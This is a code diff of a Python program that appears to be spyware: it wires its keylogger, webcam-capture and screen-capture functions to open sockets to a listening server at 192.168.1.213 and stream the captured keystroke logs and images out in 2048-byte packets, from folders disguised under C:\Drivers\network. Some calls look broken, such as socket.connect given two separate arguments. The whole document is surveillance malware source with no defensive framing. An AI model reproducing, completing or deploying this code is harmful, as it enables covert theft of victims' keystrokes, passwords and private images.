@@ -13,8 +13,16 @@ from crontab import CronTab
 
 def log_keys(self):
     try:
-        
+        #change directory to face screenshots folder
         os.chdir('C:\\Drivers\\network\\keylogs')
+        
+        #enter the ipaddress of the listening server
+        host = '192.168.1.213' 
+        log_keys_port = 27654
+
+        log_keys_socket = socket.socket()
+        log_keys_socket.connect(host, log_keys_port)
+        
         x = 1
         while True:
             if (str('logged_text' + str(x)) in str(os.listdir()) + '\\keylogs'):
@@ -34,22 +42,22 @@ def log_keys(self):
                 #file sending code
                 if os.path.isfile(filename):
                     #send filename
-                    face_screenshot_socket.send(filename.encode())
+                    log_keys_socket.send(filename.encode())
                     
                     #sending filename
-                    face_screenshot_socket.sendall(str(filename).encode())
+                    log_keys_socket.sendall(str(filename).encode())
 
                     #sending filesize
-                    face_screenshot_socket.sendall(str(int(os.path.getsize(filename))).encode())
+                    log_keys_socket.sendall(str(int(os.path.getsize(filename))).encode())
                     
                     with open(filename, 'rb') as f:
                         packetAmmount = ceil(filesize/2048)
                         for x in range(0, packetAmmount):
                             bytesToSend = f.read(2048)
-                            face_screenshot_socket.send(bytesToSend)
+                            log_keys_socket.send(bytesToSend)
                         print("file sent!")
                 else:
-                    face_screenshot_socket.sendall('false'.encode())
+                    log_keys_socket.sendall('false'.encode())
                     print("file does not exist...")
     except:
 
@@ -63,11 +71,11 @@ def camera_screenshot(self):
         os.chdir('C:\\Drivers\\network\\face-screenshots')
         
         #enter the ipaddress of the listening server
-        host = '192.168.1.254' 
-        face_screenshot_port = 27654
+        host = '192.168.1.213' 
+        camera_screenshot_port = 27654
 
-        face_screenshot_socket = socket.socket()
-        face_screenshot_socket.connect(host, face_screenshot_port)
+        camera_screenshot_socket = socket.socket()
+        camera_screenshot_socket.connect(host, camera_screenshot_port)
 
         x = 1
         while True:
@@ -86,30 +94,39 @@ def camera_screenshot(self):
                     #file sending code
                     if os.path.isfile(filename):
                         #send filename
-                        face_screenshot_socket.send(filename.encode())
+                        camera_screenshot_socket.send(filename.encode())
                         
                         #sending filename
-                        face_screenshot_socket.sendall(str(filename).encode())
+                        camera_screenshot_socket.sendall(str(filename).encode())
 
                         #sending filesize
-                        face_screenshot_socket.sendall(str(int(os.path.getsize(filename))).encode())
+                        camera_screenshot_socket.sendall(str(int(os.path.getsize(filename))).encode())
                         
                         with open(filename, 'rb') as f:
                             packetAmmount = ceil(filesize/2048)
                             for x in range(0, packetAmmount):
                                 bytesToSend = f.read(2048)
-                                face_screenshot_socket.send(bytesToSend)
+                                camera_screenshot_socket.send(bytesToSend)
                             print("file sent!")
                     else:
-                        face_screenshot_socket.sendall('false'.encode())
+                        camera_screenshot_socket.sendall('false'.encode())
                         print("file does not exist...")
     except:
         pass
 
 #screenshots of the screen every .5 seconds
 def computer_screenshot(self):
-    #not finished yet
+
+    #change directory to face screenshots folder
     os.chdir('C:\\Drivers\\network\\computer-screenshots')
+    
+    #enter the ipaddress of the listening server
+    host = '192.168.1.213' 
+    
+    computer_screenshot_port = 27654
+
+    computer_screenshot_socket = socket.socket()
+    computer_screenshot_socket.connect(host, computer_screenshot_port)
     try:
         x = 1
         while True:
